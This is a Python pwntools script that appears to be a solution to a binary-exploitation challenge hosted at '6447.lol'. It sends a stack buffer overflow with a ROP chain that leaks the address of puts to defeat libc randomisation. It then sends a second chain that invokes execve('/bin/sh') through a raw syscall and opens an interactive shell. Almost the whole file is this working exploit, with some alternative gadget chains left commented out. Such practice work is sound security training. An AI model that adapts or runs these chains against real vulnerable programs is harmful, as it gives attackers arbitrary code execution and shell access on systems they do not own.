#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 7004

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, libc
    
    # with context.local(log_level='error'):
    if args.REMOTE:
        P = remote(HOST, PORT)
    elif args.GDB:
        P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('./libc_2.39.so')

######################################
############## Exploit ###############
######################################

def exploit():
    pass

def exploit():
    chain = b''
    chain += p64(0x004011da)                # pop rdi; nop; pop rbp
    chain += p64(E.got['puts'])
    chain += p64(0)
    chain += p64(E.sym['puts'])             # essentially executing puts(puts)
    chain += p64(E.sym['main'])             # or alternately, call the vulnerable function again

    payload = b'q' * 0x80 + b'q' * 8 + chain

    P.sendlineafter(b'?\n', payload)

    puts_addr = u64(P.recvline(keepends=False).ljust(8, b'\x00'))
    libc.address = puts_addr - libc.sym['puts']

    chain = b''

    # Works locally
    # chain += p64(libc.address + 0x001753b7)                     # pop rax; pop rdx; pop rbx; ret
    # chain += p64(0x3b)
    # chain += p64(0)
    # chain += p64(0)
    # chain += p64(libc.address + 0x001bb197)                     # pop rsi; ret
    # chain += p64(0)
    # chain += p64(libc.address + 0x001bbea1)                     # pop rdi; ret
    # chain += p64(libc.address + 0x1d8678)                       # location of /bin/sh
    # chain += p64(libc.address + 0x00177cf1)                     # syscall

    chain += p64(libc.address + 0x000dd237)                         # pop rax
    chain += p64(0x3b)
    chain += p64(libc.address + 0x00126181)                         # pop rsi
    chain += p64(0)
    chain += p64(libc.address + 0x000443b5)                         # pop rdx
    chain += p64(0)
    chain += p64(libc.address + 0x001ae710)                         # pop rdi
    chain += p64(libc.address + 0x1cb42f)                           # '/bin/sh' location in libc
    chain += p64(libc.address + 0x0018ebf3)                         # syscall

    # rop = b''
    # rop += p64(libc.address + gadget('ret'))
    # rop += p64(libc.address + gadget('pop rdi; ret'))
    # rop += p64(next(libc.search(b'/bin/sh')))
    # rop += p64(libc.symbols['system'])
    # exploit = fit({1240: rop})

    payload = b'A' * 8 + p64(0x004011ec) * (0x80 // 8) + p64(0x004011ec) * 2 + chain

    P.sendlineafter(b'?\n', payload)

    P.interactive()


if __name__ == '__main__':
    connect_binary()
    exploit()
